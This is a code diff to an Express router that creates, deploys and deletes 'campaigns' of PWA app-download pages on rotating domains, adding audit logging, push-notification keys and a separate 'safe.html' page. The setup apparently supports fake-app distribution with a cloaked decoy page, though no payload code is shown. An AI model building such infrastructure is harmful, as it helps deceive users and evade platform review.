@@ -11,8 +11,9 @@ const path = require('path');
 const fs = require('fs');
 const router = express.Router();
 const { v4: uuidv4 } = require('uuid');
-const { buildDownloadPage, buildManifest, buildServiceWorker } = require('../templates/download-page');
+const { buildDownloadPage, buildSafePage, buildManifest, buildServiceWorker } = require('../templates/download-page');
 const { deployPage, removePage, verifyDeploy } = require('../services/deploy');
+const audit = require('../services/audit-log');
 const { requireAdmin } = require('../lib/auth-store');
 
 const DATA_FILE = path.join(__dirname, '../../data/campaigns.json');
@@ -81,6 +82,7 @@ router.post('/domains', requireAdmin, (req, res) => {
     });
     saveDomainRecords(records);
   }
+  audit.log('domain.create', { user: req.user?.username, target: normalized, detail: { notes: notes || '' }, ip: req.ip });
   res.json({ ok: true, domains: records, activeDomains: records.filter(d => d.status === 'active').map(d => d.domain) });
 });
 
@@ -96,6 +98,7 @@ router.patch('/domains/:domain', requireAdmin, (req, res) => {
   records[idx].updatedAt = new Date().toISOString();
   records[idx].updatedBy = req.user?.username;
   saveDomainRecords(records);
+  audit.log('domain.update', { user: req.user?.username, target: req.params.domain, detail: { status: records[idx].status }, ip: req.ip });
   res.json({ ok: true, domain: records[idx], domains: records });
 });
 
@@ -151,9 +154,14 @@ router.post('/', async (req, res) => {
     });
   }
 
-  // Generate index.html, manifest.json, sw.js
+  // Generate index.html, safe.html, manifest.json, sw.js
+  const cmsBaseUrl = process.env.CMS_BASE_URL || 'https://admin.pwaadminhub.xyz';
+  const vapidPublicKey = process.env.VAPID_PUBLIC_KEY || '';
+  const campaignId = uuidv4();
   fs.writeFileSync(path.join(STAGING_DIR, 'index.html'),
-    buildDownloadPage({ pkg, targetUrl, subdomain, domain, screenshotFiles }));
+    buildDownloadPage({ pkg, targetUrl, subdomain, domain, screenshotFiles, cmsBaseUrl, vapidPublicKey, campaignId }));
+  fs.writeFileSync(path.join(STAGING_DIR, 'safe.html'),
+    buildSafePage({ pkg }));
   fs.writeFileSync(path.join(STAGING_DIR, 'manifest.json'),
     JSON.stringify(buildManifest({ pkg, targetUrl, subdomain, domain }), null, 2));
   fs.writeFileSync(path.join(STAGING_DIR, 'sw.js'),
@@ -173,9 +181,10 @@ router.post('/', async (req, res) => {
     console.error('Deploy error:', err.message);
   }
 
-  const campaign = { id: uuidv4(), pkgId, pkgName: pkg.appName, pkgLang: pkg.lang, targetUrl, subdomain, domain, downloadUrl, deployed, verified, createdAt: new Date().toISOString() };
+  const campaign = { id: campaignId, pkgId, pkgName: pkg.appName, pkgLang: pkg.lang, targetUrl, subdomain, domain, downloadUrl, deployed, verified, createdAt: new Date().toISOString() };
   campaigns.push(campaign);
   saveCampaigns(campaigns);
+  audit.log('campaign.create', { user: req.user?.username, target: campaign.id, detail: { subdomain, domain, pkgName: pkg.appName, targetUrl, deployed, verified }, ip: req.ip });
   res.status(201).json(campaign);
 });
 
@@ -186,6 +195,7 @@ router.delete('/:id', async (req, res) => {
   const [removed] = campaigns.splice(idx, 1);
   saveCampaigns(campaigns);
   try { await removePage(removed.subdomain); } catch (e) { console.error(e.message); }
+  audit.log('campaign.delete', { user: req.user?.username, target: removed.id, detail: { subdomain: removed.subdomain, domain: removed.domain }, ip: req.ip });
   res.json({ ok: true, id: removed.id });
 });
 
